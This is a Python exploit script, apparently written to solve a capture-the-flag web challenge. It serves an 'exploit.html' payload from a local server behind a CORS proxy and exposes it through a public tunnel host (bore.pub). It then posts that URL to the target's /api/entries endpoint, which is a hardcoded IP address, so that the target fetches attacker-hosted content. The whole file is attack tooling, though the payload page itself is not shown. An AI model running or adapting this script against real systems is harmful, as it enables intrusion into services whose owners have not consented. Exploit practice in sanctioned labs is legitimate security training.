import os
import time
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import multiprocessing as mp

from cors_proxy import run_cors_proxy

TARGET = 'http://0.0.0.0:1337'
TARGET = 'http://64.227.43.207:30606'
# HOST = 'http://172.17.0.1:8000'
HOST = 'http://bore.pub:42459'
LOCAL_CORS_PROXY_PORT = 8888
LOCAL_HTTP_PORT = 8000

try:
    # Start CORS proxy
    cors_proc = mp.Process(target=run_cors_proxy,args=(LOCAL_CORS_PROXY_PORT,))
    cors_proc.start()

    # Start payload server
    def start_server(path, port=8000):
        print("[+] Serving payload server ({}) at port {}".format(path, port))

        os.chdir(path)
        class CORSRequestHandler(SimpleHTTPRequestHandler):
            def end_headers(self):
                self.send_header('Access-Control-Allow-Origin', '*')
                self.send_header('Access-Control-Allow-Methods', 'GET')
                self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
                return super(CORSRequestHandler, self).end_headers()

        httpd = HTTPServer(('', port), CORSRequestHandler)
        httpd.serve_forever()

    http_proc = mp.Process(target=start_server,args=('.', LOCAL_HTTP_PORT))
    http_proc.start()

    # Start relay servers
    # bore_http_proc= mp.Process(target=os.system,args=('ngrok http ' + LOCAL_CORS_PROXY_PORT))
    # bore_proxy_proc.start()

    # time.sleep(1000)

    # Exploit
    payload = HOST + '/exploit.html'
    structured_payload = {
        'url': payload
    }
    r = requests.post(TARGET + '/api/entries', json=structured_payload)
    print('[+] Response from initial request: ' + r.text)
    print('[+] Time taken: ' + str(r.elapsed.total_seconds()))
finally:
    # Stop servers
    active = mp.active_children()
    for child in active:
        print('[~] Stopped a server')
        child.kill()
